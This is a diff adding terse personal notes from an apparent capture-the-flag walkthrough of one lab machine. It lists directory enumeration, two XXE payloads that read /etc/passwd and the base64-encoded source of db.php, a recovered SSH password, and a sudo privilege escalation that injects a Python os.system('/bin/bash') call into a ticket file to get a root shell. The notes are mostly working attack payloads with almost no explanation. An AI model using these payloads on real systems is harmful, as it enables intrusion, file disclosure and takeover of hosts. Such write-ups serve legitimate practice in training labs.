@@ -1,0 +1,48 @@
+//With a couple of hints from Tushar De
+
+README.txt
+[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
+[X] Write tracker submit script
+[ ] Connect tracker submit script to the database
+[X] Fix developer group permissions
+
+http://10.10.11.100/log_submit.php
+http://10.10.11.100/resources/bountylog.js
+type: "POST",
+            data: {"data":data},
+            url: "tracker_diRbPr00f314.php"
+gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.100 -o gobuster.txt -x php
+db.php
+
+XXE	//remember to base64 encode and url encode payload!
+
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+		<bugreport>
+		<title>&example;</title>
+		<cwe>test</cwe>
+		<cvss>test</cvss>
+		<reward>test</reward>
+		</bugreport>
+
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
+		<bugreport>
+		<title>&example;</title>
+		<cwe>test</cwe>
+		<cvss>test</cvss>
+		<reward>test</reward>
+		</bugreport>
+
+USER : development : m19RoAU0hP41A1sTsq6K
+ssh development@10.10.11.100		//got user
+
+cat /home/development/contract.txt
+
+sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+
+/tmp/codigo.md
+# Skytrain Inc
+## Ticket to 
+__Ticket Code:__
+**109+ 10 == 119 and __import__('os').system('/bin/bash')		//got root
